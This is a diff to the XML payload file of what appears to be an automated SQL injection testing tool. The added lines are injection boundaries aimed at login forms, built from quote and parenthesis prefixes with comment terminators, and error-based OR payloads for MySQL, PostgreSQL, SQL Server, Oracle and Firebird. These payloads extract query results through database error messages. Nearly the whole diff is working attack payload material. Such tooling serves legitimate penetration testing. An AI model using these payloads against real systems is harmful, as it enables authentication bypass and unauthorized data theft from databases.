@@ -209,6 +209,7 @@ Formats:
 -->
 
 <root>
+    <!-- Generic boundaries -->
     <boundary>
         <level>1</level>
         <clause>0</clause>
@@ -217,7 +218,9 @@ Formats:
         <prefix></prefix>
         <suffix></suffix>
     </boundary>
+    <!-- End of generic boundaries -->
 
+    <!-- WHERE clause boundaries -->
     <boundary>
         <level>1</level>
         <clause>1</clause>
@@ -388,7 +391,9 @@ Formats:
         <prefix>")))</prefix>
         <suffix>AND ((("[RANDSTR]" LIKE "[RANDSTR]</suffix>
     </boundary>
+    <!-- End of WHERE clause boundaries -->
 
+    <!-- GROUP BY and ORDER BY clauses boundaries -->
     <boundary>
         <level>2</level>
         <clause>2,3</clause>
@@ -397,6 +402,219 @@ Formats:
         <prefix>,</prefix>
         <suffix></suffix>
     </boundary>
+    <!-- End of GROUP BY and ORDER BY clauses boundaries -->
+
+    <!-- Login forms to use with OR-based tests boundaries -->
+    <boundary>
+        <level>1</level>
+        <clause>0</clause>
+        <where>1,2,3</where>
+        <ptype>1</ptype>
+        <prefix></prefix>
+        <suffix></suffix>
+        <comment>--</comment>
+    </boundary>
+
+    <boundary>
+        <level>1</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>1</ptype>
+        <prefix>)</prefix>
+        <suffix></suffix>
+        <comment>--</comment>
+    </boundary>
+
+    <boundary>
+        <level>2</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>1</ptype>
+        <prefix>))</prefix>
+        <suffix></suffix>
+        <comment>--</comment>
+    </boundary>
+
+    <boundary>
+        <level>3</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>1</ptype>
+        <prefix>)))</prefix>
+        <suffix></suffix>
+        <comment>--</comment>
+    </boundary>
+
+    <boundary>
+        <level>1</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>2</ptype>
+        <prefix>'</prefix>
+        <suffix></suffix>
+        <comment>--</comment>
+    </boundary>
+
+    <boundary>
+        <level>1</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>2</ptype>
+        <prefix>')</prefix>
+        <suffix></suffix>
+        <comment>--</comment>
+    </boundary>
+
+    <boundary>
+        <level>2</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>2</ptype>
+        <prefix>'))</prefix>
+        <suffix></suffix>
+        <comment>--</comment>
+    </boundary>
+
+    <boundary>
+        <level>3</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>2</ptype>
+        <prefix>')))</prefix>
+        <suffix></suffix>
+        <comment>--</comment>
+    </boundary>
+
+    <boundary>
+        <level>2</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>3</ptype>
+        <prefix>'</prefix>
+        <suffix></suffix>
+        <comment>--</comment>
+    </boundary>
+
+    <boundary>
+        <level>2</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>3</ptype>
+        <prefix>')</prefix>
+        <suffix></suffix>
+        <comment>--</comment>
+    </boundary>
+
+    <boundary>
+        <level>3</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>3</ptype>
+        <prefix>'))</prefix>
+        <suffix></suffix>
+        <comment>--</comment>
+    </boundary>
+
+    <boundary>
+        <level>3</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>3</ptype>
+        <prefix>')))</prefix>
+        <suffix></suffix>
+        <comment>--</comment>
+    </boundary>
+
+    <boundary>
+        <level>2</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>4</ptype>
+        <prefix>"</prefix>
+        <suffix></suffix>
+        <comment>--</comment>
+    </boundary>
+
+    <boundary>
+        <level>3</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>4</ptype>
+        <prefix>")</prefix>
+        <suffix></suffix>
+        <comment>--</comment>
+    </boundary>
+
+    <boundary>
+        <level>4</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>4</ptype>
+        <prefix>"))</prefix>
+        <suffix></suffix>
+        <comment>--</comment>
+    </boundary>
+
+    <boundary>
+        <level>4</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>4</ptype>
+        <prefix>")))</prefix>
+        <suffix></suffix>
+        <comment>--</comment>
+    </boundary>
+
+    <boundary>
+        <level>3</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>5</ptype>
+        <prefix>"</prefix>
+        <suffix></suffix>
+        <comment>--</comment>
+    </boundary>
+
+    <boundary>
+        <level>4</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>5</ptype>
+        <prefix>")</prefix>
+        <suffix></suffix>
+        <comment>--</comment>
+    </boundary>
+
+    <boundary>
+        <level>5</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>5</ptype>
+        <prefix>"))</prefix>
+        <suffix></suffix>
+        <comment>--</comment>
+    </boundary>
+
+    <boundary>
+        <level>5</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>5</ptype>
+        <prefix>")))</prefix>
+        <suffix></suffix>
+        <comment>--</comment>
+    </boundary>
+
+    <boundary>
+        <level>2</level>
+        <clause>2,3</clause>
+        <where>1,2</where>
+        <ptype>1</ptype>
+        <prefix>,</prefix>
+        <suffix></suffix>
+        <comment>--</comment>
+    </boundary>
+    <!-- End of login forms to use with OR-based tests boundaries -->
 
 
     <!-- Boolean-based blind tests - WHERE clause -->
@@ -512,7 +730,7 @@ Formats:
         </details>
     </test>
 
-    <!-- TODO: check against Microsoft Access, Firebird and SAP MaxDB -->
+    <!-- TODO: check against Microsoft Access and SAP MaxDB -->
     <!-- NOTE: this does not behave as expected against SQLite, need to find another payload (TODO) -->
     <test>
         <title>Generic boolean-based blind - GROUP BY and ORDER BY clauses (append)</title>
@@ -607,7 +825,7 @@ Formats:
         </details>
     </test>
 
-    <!-- TODO: check against Microsoft Access, Firebird and SAP MaxDB -->
+    <!-- TODO: check against Microsoft Access and SAP MaxDB -->
     <!-- NOTE: this does not behave as expected against SQLite, need to find another payload (TODO) -->
     <test>
         <title>Generic boolean-based blind - GROUP BY and ORDER BY clauses (replace)</title>
@@ -629,7 +847,7 @@ Formats:
 
     <!-- Error-based tests - WHERE clause -->
     <test>
-        <title>MySQL &gt;= 5.0 error-based - WHERE clause</title>
+        <title>MySQL &gt;= 5.0 error-based - WHERE clause (AND)</title>
         <stype>2</stype>
         <level>1</level>
         <risk>0</risk>
@@ -649,7 +867,7 @@ Formats:
     </test>
 
     <test>
-        <title>PostgreSQL error-based - WHERE clause</title>
+        <title>PostgreSQL error-based - WHERE clause (AND)</title>
         <stype>2</stype>
         <level>1</level>
         <risk>0</risk>
@@ -668,7 +886,7 @@ Formats:
     </test>
 
     <test>
-        <title>Microsoft SQL Server/Sybase error-based - WHERE clause</title>
+        <title>Microsoft SQL Server/Sybase error-based - WHERE clause (AND)</title>
         <stype>2</stype>
         <level>1</level>
         <risk>0</risk>
@@ -687,7 +905,7 @@ Formats:
     </test>
 
     <test>
-        <title>Oracle error-based - WHERE clause</title>
+        <title>Oracle error-based - WHERE clause (AND)</title>
         <stype>2</stype>
         <level>1</level>
         <risk>0</risk>
@@ -706,7 +924,7 @@ Formats:
     </test>
 
     <test>
-        <title>Firebird error-based - WHERE clause</title>
+        <title>Firebird error-based - WHERE clause (AND)</title>
         <stype>2</stype>
         <level>1</level>
         <risk>0</risk>
@@ -715,6 +933,102 @@ Formats:
         <epayload>AND [RANDNUM]=('[DELIMITER_START]'||%s||'[DELIMITER_STOP]')</epayload>
         <request>
             <payload>AND [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Firebird</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0 error-based - WHERE clause (OR)</title>
+        <stype>2</stype>
+        <level>2</level>
+        <risk>2</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <epayload>OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(%s),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</epayload>
+        <request>
+            <payload>OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL error-based - WHERE clause (OR)</title>
+        <stype>2</stype>
+        <level>2</level>
+        <risk>2</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <epayload>OR [RANDNUM]=CAST('[DELIMITER_START]'||(%s)::text||'[DELIMITER_STOP]' AS NUMERIC)</epayload>
+        <request>
+            <payload>OR [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase error-based - WHERE clause (OR)</title>
+        <stype>2</stype>
+        <level>2</level>
+        <risk>2</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <epayload>OR [RANDNUM]=CONVERT(INT,('[DELIMITER_START]'+(%s)+'[DELIMITER_STOP]'))</epayload>
+        <request>
+            <payload>OR [RANDNUM]=CONVERT(INT,('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle error-based - WHERE clause (OR)</title>
+        <stype>2</stype>
+        <level>2</level>
+        <risk>2</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <epayload>OR [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((%s),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</epayload>
+        <request>
+            <payload>OR [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Firebird error-based - WHERE clause (OR)</title>
+        <stype>2</stype>
+        <level>2</level>
+        <risk>2</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <epayload>OR [RANDNUM]=('[DELIMITER_START]'||%s||'[DELIMITER_STOP]')</epayload>
+        <request>
+            <payload>OR [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]')</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -885,8 +1199,8 @@ Formats:
         </details>
     </test>
     <!--
-         TODO: if possible, add payload for SQLite, Microsoft Access,
-         Firebird and SAP MaxDB - no known techniques at this time
+         TODO: if possible, add payload for SQLite, Microsoft Access
+         and SAP MaxDB - no known techniques at this time
     -->
     <!-- End of error-based tests - GROUP BY and ORDER BY clauses -->
 
